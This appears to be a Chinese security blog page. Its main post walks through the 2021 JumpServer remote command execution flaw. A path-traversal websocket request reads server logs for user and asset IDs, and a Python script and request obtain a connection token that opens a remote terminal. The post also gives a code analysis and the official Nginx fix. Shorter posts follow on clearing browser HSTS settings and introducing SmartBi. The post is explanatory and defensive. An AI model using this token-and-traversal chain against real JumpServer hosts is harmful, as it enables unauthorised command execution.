<h2 id="获取-asset-id-system-user-id-user-id"><a href="#获取-asset-id-system-user-id-user-id" class="headerlink" title="获取 asset_id,system_user_id,user_id"></a>获取 asset_id,system_user_id,user_id</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.91.198.20:8989&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125; or &#123;&quot;task&quot;:&quot;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129153604280.png" alt="image-20210129153604280"></p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span><br></pre></td></tr></table></figure>
<h2 id="获取token"><a href="#获取token" class="headerlink" title="获取token"></a>获取token</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;?user-only&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.132.130:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: python-requests&#x2F;2.25.1</span><br><span class="line">Content-Length: 152</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155636901.png" alt="image-20210129155636901"></p>
<pre><code> 获取到token：
</code></pre>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;token&quot;:&quot;f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>有效期只有20s</p>
<p>Py-Demo</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">url_host=<span class="string">&#x27;http://192.168.132.130:8080&#x27;</span></span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    url = url_host+<span class="string">&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line">    response = requests.post(url, json=data,proxies=proxies).json()</span><br><span class="line">    print(response)</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">get_token()</span><br></pre></td></tr></table></figure>
<h2 id="获取响应的通讯ID"><a href="#获取响应的通讯ID" class="headerlink" title="获取响应的通讯ID"></a>获取响应的通讯ID</h2><p><code>ws://192.168.132.130:8080/koko/ws/token/?target_id=f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7</code></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155659430.png" alt="image-20210129155659430"></p>
<p>之后通过临时token 进行ws的访问，进而命令执行。</p>
<p>三个值在日志中体现如下：</p>
<p>1、在docker中的core中gunicorn.log文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@www jumpserver]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                       PORTS                                         NAMES</span><br><span class="line">d622578bafab        jumpserver/nginx:alpine2      <span class="string">&quot;sh -c &#x27;crond -b -d …&quot;</span>   About an hour ago   Up About an hour (healthy)   0.0.0.0:8080-&gt;80/tcp, 0.0.0.0:8443-&gt;443/tcp   jms_nginx</span><br><span class="line">1027e9f8f2ec        jumpserver/guacamole:v2.6.1   <span class="string">&quot;/init&quot;</span>                  About an hour ago   Up About an hour (healthy)   8080/tcp                                      jms_guacamole</span><br><span class="line">23f1a02bfd9d        jumpserver/core:v2.6.1        <span class="string">&quot;./entrypoint.sh sta…&quot;</span>   About an hour ago   Up About an hour (healthy)   8070/tcp, 8080/tcp                            jms_celery</span><br><span class="line">fceeb00ef925        jumpserver/luna:v2.6.1        <span class="string">&quot;/docker-entrypoint.…&quot;</span>   About an hour ago   Up About an hour (healthy)   80/tcp                                        jms_luna</span><br><span class="line">f9dbd7a214a1        jumpserver/koko:v2.6.1        <span class="string">&quot;./entrypoint.sh&quot;</span>        About an hour ago   Up About an hour (healthy)   0.0.0.0:2222-&gt;2222/tcp, 5000/tcp              jms_koko</span><br><span class="line">de0493c1c684        jumpserver/lina:v2.6.1        <span class="string">&quot;/docker-entrypoint.…&quot;</span>   About an hour ago   Up About an hour (healthy)   80/tcp                                        jms_lina</span><br><span class="line">b58ecd6cd3d8        jumpserver/core:v2.6.1        <span class="string">&quot;./entrypoint.sh sta…&quot;</span>   About an hour ago   Up About an hour (healthy)   8070/tcp, 8080/tcp                            jms_core</span><br><span class="line">72599fc5b96e        jumpserver/redis:6-alpine     <span class="string">&quot;docker-entrypoint.s…&quot;</span>   3 days ago          Up 3 hours (healthy)         6379/tcp                                      jms_redis</span><br><span class="line">c2cecdd822bc        jumpserver/mysql:5            <span class="string">&quot;docker-entrypoint.s…&quot;</span>   3 days ago          Up 3 hours (healthy)         3306/tcp, 33060/tcp                           jms_mysql</span><br><span class="line">[root@www jumpserver]<span class="comment"># docker exec -it b58ecd6cd3d8 bash</span></span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver<span class="comment"># ls</span></span><br><span class="line">apps		    data	entrypoint.sh  logs	     release	    tmp</span><br><span class="line">config_example.yml  Dockerfile	jms	       README_EN.md  requirements   utils</span><br><span class="line">config.yml	    docs	LICENSE        README.md     run_server.py  Vagrantfile</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver<span class="comment"># cd logs</span></span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># ls</span></span><br><span class="line">ansible.log			     celery_heavy_tasks.log  gunicorn.log</span><br><span class="line">beat.log			     celery_node_tree.log    jumpserver.log</span><br><span class="line">celery_ansible.log		     daphne.log		     unexpected_exception.log</span><br><span class="line">celery_check_asset_perm_expired.log  drf_exception.log</span><br><span class="line">celery_default.log		     flower.log</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># cat gunicorn.log  | grep api/v1/perms/asset-permissions/user/validate</span></span><br><span class="line">192.168.250.6 [25/Jan/2021:17:03:58 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:03:58 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:04:22 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:44:13 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:18:02:16 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>2、</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="查看代码修改记录"><a href="#查看代码修改记录" class="headerlink" title="查看代码修改记录"></a>查看代码修改记录</h2><p>1、查看单个文件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/blob/master/apps/authentication/api/auth.py">https://github.com/jumpserver/jumpserver/blob/master/apps/authentication/api/auth.py</a></p>
<p>2、查看历史记录</p>
<p>将github.com替换为github.githistory.xyz</p>
<p>3、查看修改日期2021-01-14</p>
<p><a target="_blank" rel="noopener" href="https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py">https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/commit/db6f7f66b2e5e557081cb561029f64af0a1f80c4">https://github.com/jumpserver/jumpserver/commit/db6f7f66b2e5e557081cb561029f64af0a1f80c4</a></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218163819021.png" alt="image-20210218163819021"></p>
<h2 id="代码调用逻辑"><a href="#代码调用逻辑" class="headerlink" title="代码调用逻辑"></a>代码调用逻辑</h2><p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/d45b6183332c145770f174c3effa49f0.png" alt="img"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/079d1e2b0daeb9145aa74a74f390fc44.png" alt="img"></p>
<p> web终端地方存在相关token操作的js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let wsURL &#x3D; baseWsUrl + &#39;&#x2F;koko&#x2F;ws&#x2F;terminal&#x2F;?&#39; + urlParams.toString();</span><br><span class="line">switch (urlParams.get(&quot;type&quot;)) &#123;</span><br><span class="line">    case &#39;token&#39;:</span><br><span class="line">        wsURL &#x3D; baseWsUrl + &quot;&#x2F;koko&#x2F;ws&#x2F;token&#x2F;?&quot; + urlParams.toString();</span><br><span class="line">        break</span><br><span class="line">    default:</span><br><span class="line">&#125;</span><br><span class="line">ws &#x3D; new WebSocket(wsURL, [&quot;JMS-KOKO&quot;]);</span><br><span class="line">term &#x3D; createTerminalById(elementId)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func (s *server) websocketHandlers(router *gin.RouterGroup) &#123; #web终端地方存在相关token操作的js的对应服务端&#x2F;ws&#x2F;token 路由</span><br><span class="line">    wsGroup :&#x3D; router.Group(&quot;&#x2F;ws&#x2F;&quot;)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;terminal&quot;).Use(</span><br><span class="line">        s.middleSessionAuth()).GET(&quot;&#x2F;&quot;, s.processTerminalWebsocket)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;elfinder&quot;).Use(</span><br><span class="line">        s.middleSessionAuth()).GET(&quot;&#x2F;&quot;, s.processElfinderWebsocket)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;token&quot;).GET(&quot;&#x2F;&quot;, s.processTokenWebsocket)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s *server) processTokenWebsocket(ctx *gin.Context) &#123; #判断是否有token,并查询相应的token对应的参数并运行虚拟终端</span><br><span class="line">    tokenId, _ :&#x3D; ctx.GetQuery(&quot;target_id&quot;)</span><br><span class="line">    tokenUser :&#x3D; service.GetTokenAsset(tokenId)</span><br><span class="line">    if tokenUser.UserID &#x3D;&#x3D; &quot;&quot; &#123;</span><br><span class="line">        logger.Errorf(&quot;Token is invalid: %s&quot;, tokenId)</span><br><span class="line">        ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    currentUser :&#x3D; service.GetUserDetail(tokenUser.UserID)</span><br><span class="line">    if currentUser &#x3D;&#x3D; nil &#123;</span><br><span class="line">        logger.Errorf(&quot;Token userID is invalid: %s&quot;, tokenUser.UserID)</span><br><span class="line">        ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    targetType :&#x3D; TargetTypeAsset</span><br><span class="line">    targetId :&#x3D; strings.ToLower(tokenUser.AssetID)</span><br><span class="line">    systemUserId :&#x3D; tokenUser.SystemUserID</span><br><span class="line">    s.runTTY(ctx, currentUser, targetType, targetId, systemUserId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="浏览器体现方式"><a href="#浏览器体现方式" class="headerlink" title="浏览器体现方式"></a>浏览器体现方式</h2><p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174232535.png" alt="image-20210218174232535"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174240992.png" alt="image-20210218174240992"></p>
<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>官方修复方式：</p>
<p><a target="_blank" rel="noopener" href="https://blog.fit2cloud.com/?p=1761">https://blog.fit2cloud.com/?p=1761</a></p>
<ol>
<li>将JumpServer升级至安全版本；</li>
<li>临时修复方案:</li>
</ol>
<p>修改 Nginx 配置文件屏蔽漏洞接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure>
<p>Nginx 配置文件位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 社区老版本</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># 企业老版本</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"></span><br><span class="line"># 新版本在 </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure>
<p>修改 Nginx 配置文件实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 保证在 &#x2F;api 之前 和 &#x2F; 之前</span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 新增以上这些</span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>修改完成后重启 nginx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker方式: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginx方式:</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>
<p>修复验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># 使用方法 bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-23T09:21:22.000Z" title="2021-1-23 17:21:22">2021-01-23</time>发表</span><span class="level-item"><time dateTime="2021-01-23T09:29:03.389Z" title="2021-1-23 17:29:03">2021-01-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">9 分钟读完 (大约1320个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/23/%E5%85%B3%E9%97%AD%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84HSTS%E5%8A%9F%E8%83%BD/">关闭常见浏览器的HSTS功能</a></h1><div class="content"><h1 id="HSTS简介"><a href="#HSTS简介" class="headerlink" title="HSTS简介"></a>HSTS简介</h1><p>​        HSTS代表的是HTTPS严格传输安全协议，它是一个网络安全政策机制，能够强迫浏览器只通过安全的HTTPS连接（永远不能通过HTTP）与网站交互。这能够帮助防止协议降级攻击和cookie劫持。</p>
<p>​        HSTS最初是为了响应Moxie Marlinspike在2009 BlackHat Federal（2009年黑帽安全大会）上进行的题为“实践中击败SSL的新技巧”的演讲中所提出的一个漏洞而创建的。HSTS所防御的特定漏洞就是利用的是Marlinspike发布的一款叫做SSLStrip的工具。</p>
<p>​        本质上，这个工具是通过将安全的HTTPS连接转换回不安全的HTTP连接来工作的。通过告知浏览器应当使用HTTPS连接，HSTS能够修复这一问题。HSTS还能帮助避免Firesheep等常见工具窃取基于cookie的登录凭证。    </p>
<p>​        不幸的是，部分HSTS设置可能会不经意地造成浏览器错误。例如，如果你使用的是Chrome，你可能就会遇到：</p>
<p><strong>“隐私错误：你的连接不是私人的”（NET::ERR_CERT_AUTHORITY_INVALID）。</strong></p>
<p>在安装配置 SSL 证书时，可以使用一种能使数据传输更加安全的Web安全协议，即在服务器端上开启<code>HSTS</code> (HTTP Strict Transport Security)。它告诉浏览器只能通过HTTPS访问，而绝对禁止HTTP方式。</p>
<blockquote>
<p>HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.</p>
</blockquote>
<p>但是，在日常开发的过程中，有时我们会想测试页面在 HTTP 连接中的表现情况，这时 HSTS 的存在会让调试不能方便的进行下去。而且由于 HSTS 并不是像 cookie 一样存放在浏览器缓存里，简单的清空浏览器缓存操作并没有什么效果，页面依然通过 HTTPS 的方式传输。那么怎样才能关闭浏览器的 HSTS 呢，各种谷歌<del>度娘</del>之后，在这里汇总一下几大常见浏览器 HSTS 的关闭方法。</p>
<h1 id="Safari-浏览器"><a href="#Safari-浏览器" class="headerlink" title="Safari 浏览器"></a>Safari 浏览器</h1><ol>
<li>完全关闭 Safari</li>
<li>删除 <code>~/Library/Cookies/HSTS.plist</code> 这个文件</li>
<li>重新打开 Safari 即可</li>
<li>极少数情况下，需要重启系统</li>
</ol>
<h1 id="Chrome-浏览器"><a href="#Chrome-浏览器" class="headerlink" title="Chrome 浏览器"></a>Chrome 浏览器</h1><ol>
<li>地址栏中输入 <code>chrome://net-internals/#hsts</code></li>
<li>在 <code>Delete domain</code> 中输入项目的域名，并<code>Delete</code> 删除</li>
<li>可以在 <code>Query domain</code> 测试是否删除成功</li>
</ol>
<p>PS：<code>chrome://net-internals/#hsts</code>是Chrome用来管理你的浏览器的本地HSTS设置的UI</p>
<h1 id="Opera-浏览器"><a href="#Opera-浏览器" class="headerlink" title="Opera 浏览器"></a>Opera 浏览器</h1><p>和 Chrome 方法一样</p>
<h1 id="Firefox-浏览器"><a href="#Firefox-浏览器" class="headerlink" title="Firefox 浏览器"></a>Firefox 浏览器</h1><p>方法一：</p>
<ol>
<li>关闭所有已打开的页面</li>
<li>清空历史记录和缓存</li>
<li>地址栏输入<code>about:permissions</code></li>
<li>搜索项目域名，并点击 <code>Forget About This Site</code></li>
</ol>
<p>方法二：</p>
<ol>
<li>关闭Firefox中所有打开的标签。</li>
</ol>
<ol start="2">
<li>利用键盘快捷键Ctrl + Shift + H（Mac上为Cmd + Shift + H）打开完整的历史窗口。在以下步骤中，你必须使用到这一窗口或侧边栏。</li>
</ol>
<ol start="3">
<li>找到你想要为之删除HSTS设置的网站——如果需要，你可以在右上角搜索该网站。</li>
</ol>
<ol start="4">
<li>从项目列表中右键点击该网站，并点击忘记这个网站。这将会清除这个域名的HSTS设置（以及其他缓存数据）。</li>
</ol>
<ol start="5">
<li>重启Firefox并访问该网站。你现在应当能够通过HTTP/中断的HTTPS访问这一网站了。如果这些说明行不通，那么你可以尝试以下手动方式：</li>
</ol>
<p>方法三：</p>
<p>首先，通过你的操作系统的文件资源管理器来定位你的Firefox配置文件。你可以通过导航到about:support来找到Firefox的这一文件夹。</p>
<p>向下滚动到页面中部，在应用程序基本要素部分，你将看到配置文件夹。点击打开文件夹。</p>
<p>现在关闭Firefox，因此浏览器便不会覆盖我们将要进行修改的任何设置。</p>
<p>在你的配置文件夹中，找到并打开文件SiteSecurityServiceState.txt。该文件包含了你之前访问的域名的HSTS和HPKP（Key Pinning，一种独立的HTTPS机制）缓存设置。</p>
<p>搜索你想要为之清除HSTS设置的域名，并将它从文件中删除。每个条目都有域名。删除从想要的域名开始到下一个列出的域名中的所有的条目。还有一种方法，你可以将现有文件从a .txt重命名为a .bak（为了保存现有的文件，以防万一）并允许Firefox在下次启动时创建一个全新的文件。</p>
<p>以下是一个简单的HSTS列表示例。</p>
<p><a href="http://www.thesslstore.com:HSTS">www.thesslstore.com:HSTS</a>          0               17312   1527362896190,1,0</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.racent.com/blog/clear-hsts-settings-chrome-firefox">https://www.racent.com/blog/clear-hsts-settings-chrome-firefox</a></p>
<p><a target="_blank" rel="noopener" href="https://kebingzao.com/2020/05/25/header-hsts/">https://kebingzao.com/2020/05/25/header-hsts/</a></p>
<p><a target="_blank" rel="noopener" href="https://iamkun.com/node/51">https://iamkun.com/node/51</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-12T02:10:53.000Z" title="2021-1-12 10:10:53">2021-01-12</time>发表</span><span class="level-item"><time dateTime="2021-01-12T10:47:50.245Z" title="2021-1-12 18:47:50">2021-01-12</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">30 分钟读完 (大约4465个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/">smartBi总结</a></h1><div class="content"><h1 id="SmartBi简介"><a href="#SmartBi简介" class="headerlink" title="SmartBi简介"></a>SmartBi简介</h1><p>Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富500强的10家国内银行，有8家选用了Smartbi。</p>
<h1 id="登录入口"><a href="#登录入口" class="headerlink" title="登录入口"></a>登录入口</h1><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/mobileportal.jsp">https://127.0.0.1/vision/mobileportal.jsp</a></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/mobileX/login">https://127.0.0.1/vision/mobileX/login</a></p>
